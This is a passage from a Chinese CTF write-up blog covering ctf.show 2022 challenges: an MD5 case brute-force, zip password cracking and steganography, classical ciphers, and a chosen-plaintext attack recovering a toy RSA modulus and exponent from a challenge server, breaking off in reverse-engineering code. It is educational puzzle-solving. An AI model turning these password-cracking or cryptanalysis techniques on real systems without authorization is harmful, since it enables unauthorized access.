gmpy2.gcd(m,w)==<span class="hljs-number">1</span><br>h=<span class="hljs-number">0</span><br>j=<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> m.bit_length()%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>    h=m.bit_length()<br>    j=<span class="hljs-built_in">int</span>(h//<span class="hljs-number">2</span>)<br><span class="hljs-keyword">else</span>:<br>    h=m.bit_length()<br>    j=<span class="hljs-built_in">int</span>(h//<span class="hljs-number">2</span>+<span class="hljs-number">1</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">m,lenth</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(m)&lt;lenth:<br>        m=<span class="hljs-string">&#x27;0&#x27;</span>+m<br>    <span class="hljs-keyword">return</span> m<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">keygen</span>():<br>    pk=[]<br>    sk=[]<br>    sk.append(m)<br>    sk.append(<span class="hljs-built_in">int</span>(gmpy2.invert(w,m)))<br>    D=[]<br>    binD=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        di=(w*Bag[i])%m<br>        D.append(di)<br>        bindi=<span class="hljs-built_in">bin</span>(di)[<span class="hljs-number">2</span>:]<br>        bindi=pad(bindi,h)<br>        binD.append(bindi)<br>    U=[]<br>    V=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        tempu=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(binD[i][:j]),<span class="hljs-number">2</span>)<br>        U.append(tempu)<br>        tempv=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(binD[i][j:]),<span class="hljs-number">2</span>)<br>        V.append(tempv)<br>    e=gmpy2.next_prime(<span class="hljs-built_in">sum</span>(V))+<span class="hljs-number">2</span><br>    f=gmpy2.next_prime(<span class="hljs-built_in">sum</span>(U))<br>    <span class="hljs-keyword">assert</span> gmpy2.gcd(e,f)==<span class="hljs-number">1</span><br>    sk.append(<span class="hljs-built_in">int</span>(e))<br>    sk.append(<span class="hljs-built_in">int</span>(f))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        ai=e*U[i]+f*V[i]<br>        pk.append(<span class="hljs-built_in">int</span>(ai))<br>    <span class="hljs-keyword">return</span> pk,sk<br>Pk,Sk=keygen()<br><span class="hljs-built_in">print</span>(Pk)<br><span class="hljs-built_in">print</span>(Sk)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Encrypt</span>(<span class="hljs-params">plain,pk</span>):<br>    mbin=<span class="hljs-built_in">bin</span>(plain)[<span class="hljs-number">2</span>:]<br>    c=<span class="hljs-number">0</span><br>    mbin=pad(mbin,Baglenth)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        c=c+<span class="hljs-built_in">int</span>(mbin[i])*pk[i]<br>    <span class="hljs-keyword">return</span> c<br>c=Encrypt(message,Pk)<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-comment"># c = 1475864207352419823225329328555476398971654057144688193866218781853021651529290611526242518</span><br><br><span class="hljs-comment"># 这里print(sk,pk)输出的数据我没有复制过来。这个程序你跑一边就能得到那些数据了。</span><br></code></pre></td></tr></table></figure><p>找到了相关的资料：</p><p><a href="https://blog.csdn.net/qq_43968080/article/details/102953485">https://blog.csdn.net/qq_43968080/article/details/102953485</a></p><p>可以看到代码中的Bag很明显符合这个超增量背包这个概念，说明这个魔改的背包公钥算法。而观察背包公钥算法的解密部分，需要的求一个逆让密文与这个逆进行模乘运算，最后使用超增量的方式进行贪心遍历即可得到解。</p><p>原本想了一下，Pk本身不就是一个超增量背包吗，不能直接进行排序求解吗，结果还真不行。</p><p>看一下sk都给了些什么，m,w和e,f都给了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>    di=(w*Bag[i])%m<br>    D.append(di)<br>    bindi=<span class="hljs-built_in">bin</span>(di)[<span class="hljs-number">2</span>:]<br>    bindi=pad(bindi,h)<br>    binD.append(bindi)<br></code></pre></td></tr></table></figure><p>查了查资料想用LLL算法直接梭哈一把，可惜没能成功。(数学功底太差了，看不懂结果，我觉得答案应该在输出的结果中，但是我不知道是哪一个。)</p>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>MISC</tag>
      
      <tag>Reverse， PWN， Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>单身杯(dsb) 2022</title>
    <link href="/2022/05/22/%E5%8D%95%E8%BA%AB%E6%9D%AF-dsb-2022/"/>
    <url>/2022/05/22/%E5%8D%95%E8%BA%AB%E6%9D%AF-dsb-2022/</url>
    
    <content type="html"><![CDATA[<p>ctf.show的2022单身杯中 没大没小的串串、misc签到、古典base、TooYoungRSA、re签到、magic、pwn签到的题解。</p><span id="more"></span><img src="https://s2.loli.net/2022/05/20/qSLBC9fJPiw5RaE.jpg" alt="我的520" style="zoom: 33%;" /><p>我觉得我连萌新都不如…</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="没大没小的串串"><a class="markdownIt-Anchor" href="#没大没小的串串"></a> 没大没小的串串</h2><figure class="highlight sqf"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs sqf">描述:<br>打乱了大小写的<span class="hljs-built_in">flag</span>是 y0U_RE4lLy_kn0W_TH1S_ConGr4tUlAT10Ns<br>其中正确的<span class="hljs-built_in">flag</span>的md5是 <span class="hljs-number">7513209051</span>f455fa44d0fa5cd0f3e051<br></code></pre></td></tr></table></figure><p>写个爆破脚本跑就行了。我自己不知道有什么好的笛卡尔乘积的生成方法。所以这个代码不太好看…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><br>data1 = <span class="hljs-string">&quot;y0U_RE4lLy_kn0W_TH1S_ConGr4tUlAT10Ns&quot;</span>.upper()<br>data2 = data1.lower()<br><br>data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data1)):<br>    <span class="hljs-keyword">if</span> data1[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>]:<br>        data.append([data1[i]])<br>        <span class="hljs-keyword">continue</span><br>    data.append([data1[i], data2[i]])<br><br>x = itertools.product(data[<span class="hljs-number">0</span>],data[<span class="hljs-number">1</span>],data[<span class="hljs-number">2</span>],data[<span class="hljs-number">3</span>],data[<span class="hljs-number">4</span>],data[<span class="hljs-number">5</span>],data[<span class="hljs-number">6</span>],data[<span class="hljs-number">7</span>],<br>                  data[<span class="hljs-number">8</span>],data[<span class="hljs-number">9</span>],data[<span class="hljs-number">10</span>],data[<span class="hljs-number">11</span>],data[<span class="hljs-number">12</span>],data[<span class="hljs-number">13</span>],data[<span class="hljs-number">14</span>],data[<span class="hljs-number">15</span>],<br>                  data[<span class="hljs-number">16</span>],data[<span class="hljs-number">17</span>],data[<span class="hljs-number">18</span>],data[<span class="hljs-number">19</span>],data[<span class="hljs-number">20</span>],data[<span class="hljs-number">21</span>],data[<span class="hljs-number">22</span>],data[<span class="hljs-number">23</span>],<br>                  data[<span class="hljs-number">24</span>],data[<span class="hljs-number">25</span>],data[<span class="hljs-number">26</span>],data[<span class="hljs-number">27</span>],data[<span class="hljs-number">28</span>],data[<span class="hljs-number">29</span>],data[<span class="hljs-number">30</span>],data[<span class="hljs-number">31</span>],<br>                  data[<span class="hljs-number">32</span>],data[<span class="hljs-number">33</span>],data[<span class="hljs-number">34</span>],data[<span class="hljs-number">35</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    <span class="hljs-keyword">if</span> hashlib.md5(<span class="hljs-string">&quot;&quot;</span>.join(i).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest() == <span class="hljs-string">&quot;7513209051f455fa44d0fa5cd0f3e051&quot;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(i))<br>        <span class="hljs-keyword">break</span><br>        <br><span class="hljs-comment"># y0U_Re4llY_kN0w_TH1s_coNgr4TULat10nS</span><br><span class="hljs-comment"># ctfshow&#123;y0U_Re4llY_kN0w_TH1s_coNgr4TULat10nS&#125;</span><br></code></pre></td></tr></table></figure><h2 id="misc签到"><a class="markdownIt-Anchor" href="#misc签到"></a> misc签到</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">重要提示：<br>压缩包密码是<span class="hljs-number">5</span>位字符<br>lsb有内容<br><span class="hljs-built_in">flag</span>包含<span class="hljs-number">5</span>个空格、<span class="hljs-number">2</span>个逗号，均替换为下划线，连续只留<span class="hljs-number">1</span>个下划线<br></code></pre></td></tr></table></figure><p>压缩包直接爆破密码。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">61f@</span>X<br></code></pre></td></tr></table></figure><p>然后他说lsb里面有内容，直接stegosolve抓lsb结果啥都没找到，怀疑不会藏在中间部分了。结果看了一圈lsb都没找到有用的信息…</p><p>最后直接查看二进制的图片发现文件尾部附上了一段base64。看来做题还得走一个标准流程，指不定就忘了…</p><p>得到的base64 cyberchef转换一下。是一个缺少定位标的二维码。</p><p>先把定位标补上。嗯好像这个二维码有点不太符合规范，按理来说定位标附近实要留白的，这里确实黑色。所以现将二维码反色再添加。</p><p>得到：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">6</span>C75652C20666172206578636565647320796F75722062656C6965667D<br><span class="hljs-built_in">lue,</span> far exceeds your belief&#125;<br></code></pre></td></tr></table></figure><p>这个只是一部分的，那么还缺少一部分。</p><p>到这里只有LSB的提示没有用了，所以猜测是lsb。StegoSolve看这个二维码没找到，那应该是软件隐写。一圈软件照下来都没找到…</p><p>最后再网上搜LSB工具的时候找到个zsteg，这个我还没用过，不过看评价还挺不错？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/CTF/dsb]<br>└─$ zsteg -a download.png<br>b6,abgr,msb,xy      .. file: MPEG ADTS, layer I, v2, 112 kbps, Monaural<br>b7,abgr,lsb,xy      .. file: , 48 kHz, Monaural<br>b8,rgb,msb,xy       .. file: RDI Acoustic Doppler Current Profiler (ADCP)<br>b8,rgba,msb,xy      .. file: RDI Acoustic Doppler Current Profiler (ADCP)<br>b1,r,lsb,xy,prime   .. file: MPEG ADTS, layer II, v1, 112 kbps, Stereo<br>b1,r,lsb,yx         .. text: &quot;ctfshow&#123;Your potential,va&quot;<br>b6,abgr,msb,yx      .. file: MPEG ADTS, layer I, v2, 112 kbps, Monaural<br>b7,abgr,lsb,yx      .. file: , 48 kHz, Monaural<br><br></code></pre></td></tr></table></figure><p>这里能看到我们的flag了。好像确实挺好用的？ 工具+1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ctfshow&#123;Your potential,value, far exceeds your belief&#125;</span><br></code></pre></td></tr></table></figure><p>然后忘了换里面的字符了…</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># ctfshow&#123;Your_potential_value_far_exceeds_your_belief&#125;</span><br></code></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="古典base"><a class="markdownIt-Anchor" href="#古典base"></a> 古典base</h2><p>我这边得到的信息是：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">YRchdsYIYNY0ZALQZYYIY0NUNQMZNNC</span><span class="hljs-operator">=</span><span class="hljs-number">3</span>m2v3wj0zjS0j4T4DtjwiyDymy2l29g<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>可以看到两个==位置不对，能这样改变字符位置的，应该是栅栏密码，分组长度应该为2</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Y<span class="hljs-number">3</span>Rmc<span class="hljs-number">2</span>hvd<span class="hljs-number">3</span>swYjI<span class="hljs-number">0</span>Yz<span class="hljs-symbol">NjYS00</span>ZjA<span class="hljs-number">4</span>LTQ<span class="hljs-number">4</span>ZDYtYjIwYi<span class="hljs-number">0</span>y<span class="hljs-symbol">NDUyNmQyM2</span>Zl<span class="hljs-symbol">N2</span><span class="hljs-symbol">N9</span>Cg==<br></code></pre></td></tr></table></figure><p>base64解密</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">0</span>b24c3ca-<span class="hljs-number">4</span>f08-<span class="hljs-number">48</span>d6-b20b-<span class="hljs-number">24526</span>d23fe7c&#125;<br></code></pre></td></tr></table></figure><h2 id="tooyoungrsa"><a class="markdownIt-Anchor" href="#tooyoungrsa"></a> TooYoungRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nevergonnagiveyouup <span class="hljs-keyword">import</span> n, e<br><span class="hljs-keyword">import</span> secrets<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        flag = f.read().strip()<br><br>    k = secrets.randbelow(n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ck = <span class="hljs-subst">&#123;<span class="hljs-built_in">pow</span>(k, e, n)&#125;</span>&quot;</span>)<br>    key = sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ct = <span class="hljs-subst">&#123;cipher.encrypt(pad(flag, AES.block_size)).<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        nevergonnaletyoudown = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;I just wanna tell you how i&#x27;m feeling... &quot;</span>))<br>        <span class="hljs-keyword">assert</span> nevergonnaletyoudown &gt;= <span class="hljs-number">0</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;gotta make you understand: <span class="hljs-subst">&#123;<span class="hljs-built_in">pow</span>(nevergonnaletyoudown, e, n)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>链接nc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">F:\CTFTools\yafu-1.34&gt;nc pwn.challenge.ctf.show 28155<br>ck = 53830851938944413421825489946783740501<br>ct = 2d67acfe897ac185cfff0beeaf38856356bc0e0a67f253e4da25129c6c409cde165657e156ab7386060222951a532176<br>I just wanna tell you how i&#x27;m feeling...<br>2<br>gotta make you understand: 9088662731338809664100216653347181076<br>I just wanna tell you how i&#x27;m feeling...<br>4<br>gotta make you understand: 61547101391097434247253645201221024635<br>I just wanna tell you how i&#x27;m feeling...<br>8<br>gotta make you understand: 9368775312576566895016755847461863720<br>I just wanna tell you how i&#x27;m feeling...<br>16<br>gotta make you understand: 75933324863129460082479849068964500501<br>I just wanna tell you how i&#x27;m feeling...<br></code></pre></td></tr></table></figure><p>选择明文攻击</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> gmpy2 import gcd<br><br><span class="hljs-attribute">c2</span> = <span class="hljs-number">9088662731338809664100216653347181076</span><br><span class="hljs-attribute">c4</span> = <span class="hljs-number">61547101391097434247253645201221024635</span><br><span class="hljs-attribute">c8</span> = <span class="hljs-number">9368775312576566895016755847461863720</span><br><span class="hljs-attribute">c16</span> = <span class="hljs-number">75933324863129460082479849068964500501</span><br><br><span class="hljs-attribute">dif1</span> = pow(c2,<span class="hljs-number">2</span>) - c4<br><span class="hljs-attribute">dif2</span> = pow(c2,<span class="hljs-number">3</span>) - c8<br><span class="hljs-attribute">dif3</span> = pow(c2,<span class="hljs-number">4</span>) - c16<br><br><br><span class="hljs-attribute">n</span> = gcd(gcd(dif1,dif2), gcd(dif2,dif3))<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n = &quot;</span>, n)<br><br><span class="hljs-attribute">e</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">while</span> pow(<span class="hljs-number">2</span>, e, n) != c2:<br>    <span class="hljs-attribute">e</span> += <span class="hljs-number">1</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;e = &quot;</span>, e)<br><br><span class="hljs-comment"># n =  190128968349217409128719777740062362481</span><br><span class="hljs-comment"># e =  652019</span><br></code></pre></td></tr></table></figure><p>这里其实只用两个dif做GCD也可以的。如果e跑的时间比较久的话，可以考虑重新获取数据，重新连一下nc，他会重新生成n和e的。</p><p>得到的n用yafu分解。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">starting SIQS on c39: 190128968349217409128719777740062362481<br><br>==== sieving in progress (1 thread):     624 relations needed ====<br>====           Press ctrl-c to abort and save state           ====<br>518 rels found: 285 full + 233 from 2212 partial, (30808.14 rels/sec)<br><br>SIQS elapsed time = 0.1090 seconds.<br>Total factoring time = 0.2692 seconds<br><br><br>***factors found***<br><br>P20 = 14093563172030264239<br>P20 = 13490482571968928479<br><br>ans = 1<br></code></pre></td></tr></table></figure><p>最后求d，然后AES解密即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcd, invert, powmod<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>n =  <span class="hljs-number">190128968349217409128719777740062362481</span><br>p = <span class="hljs-number">14093563172030264239</span><br>q = <span class="hljs-number">13490482571968928479</span><br>e =  <span class="hljs-number">652019</span><br><br>d = invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>ck = <span class="hljs-number">53830851938944413421825489946783740501</span><br>ct = <span class="hljs-string">&quot;2d67acfe897ac185cfff0beeaf38856356bc0e0a67f253e4da25129c6c409cde165657e156ab7386060222951a532176&quot;</span><br><br>k = powmod(ck,d,n)<br>key = sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br><br><span class="hljs-built_in">print</span>(cipher.decrypt(<span class="hljs-built_in">bytes</span>.fromhex(ct)))<br><br><span class="hljs-comment"># ctfshow&#123;8dcb976f-5e92-4d36-89ac-c2273bf442e1&#125;</span><br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="re签到"><a class="markdownIt-Anchor" href="#re签到"></a> re签到</h2><p>IDA打开里面有个很像base64的字符串，拉出来base64解密即可得到flag。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile">V2toT2FWZ3pTbXhZTTA1d1dqSTFabUZYTldaaFNFNTZZek5PZW1NelRucGpkejA5<br><span class="hljs-section">decode:</span><br>WkhOaVgzSmxYM05wWjI1ZmFXNWZhSE56YzNOemMzTnpjdz09<br><span class="hljs-section">decode:</span><br>ZHNiX3JlX3NpZ25faW5faHNzc3Nzc3Nzcw==<br><span class="hljs-section">decode:</span><br>dsb_re_sign_in_hsssssssss<br><br><span class="hljs-comment"># ctfshow&#123;dsb_re_sign_in_hsssssssss&#125;</span><br></code></pre></td></tr></table></figure><h2 id="magic"><a class="markdownIt-Anchor" href="#magic"></a> magic</h2><p>题目信息：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>个密码只有<span class="hljs-number">1</span>个是正确的<br></code></pre></td></tr></table></figure><p>逆向。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;plz input your password:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)checkToken(v5) )<br>    <span class="hljs-built_in">puts</span>(aCongratulation);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;password is incorrect!&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入checkToken函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">checkToken</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)checkSum(a1) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)p(a1) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)h(a1);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里返回一个bool根据判断条件，这里要这三个都为真才可以。</p><p>进入第一个checkSum。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">checkSum</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+10h] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( a1 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v3 += a1 % <span class="hljs-number">10</span>;<br>    a1 /= <span class="hljs-number">10</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v3 == <span class="hljs-number">58</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个是判断a1这个数的所有十进制位的数字之和是不是58。</p><p>进入p函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">p</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">2</span>; <span class="hljs-built_in">sqrt</span>((<span class="hljs-type">double</span>)a1) &gt;= (<span class="hljs-type">double</span>)i; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !(a1 % i) )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span 